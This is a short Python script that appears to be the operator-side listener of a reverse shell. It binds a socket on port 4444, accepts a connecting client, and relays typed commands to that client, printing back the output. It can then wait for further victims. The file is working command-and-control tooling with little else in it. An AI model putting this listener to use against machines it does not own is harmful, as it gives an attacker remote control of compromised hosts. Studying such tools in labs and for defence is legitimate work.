import sys
import socket
import os
from dotenv import load_dotenv
    
#USE .env FOR YOUR PRIVACY
load_dotenv()

SERVER_IP = os.getenv("SERVER_IP")
PORT = 4444  # YOU CAN SET YOUR PORT NUMBER HERE

s = socket.socket()        
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((SERVER_IP,PORT)) # WAITING FOR CONNECTION BETWEEN C & S

s.listen(1)

while True :
    print(f'[+] Listenting as {SERVER_IP}:{PORT}')

    client = s.accept()
    print(f'[+] Client connected {client[1]}')  #ENSUERS THE CONNECTION

    client[0].send('Connected'.encode())
    while True:
        cmd = input('>>> ')     # INPUTING COMMANDS 
        client[0].send(cmd.encode())


        if cmd.lower() in ['exit','q','e','quit']:
            break

        result = client[0].recv(1024).decode() # RECEVIES THE MSG FROM CLEINT ADN DECODES
        print(result)

    client[0].close() # CLOSES THE CURRENT CLEINT CONNECTION 

    cmd = input('wait for new client y/n ?') or 'y' # ASKS TO WAIT FOR ANOTHER CONNECTION

    if cmd.lower() in ['n','no']:
        break

s.close()    # CLOSES THE PROGRAM  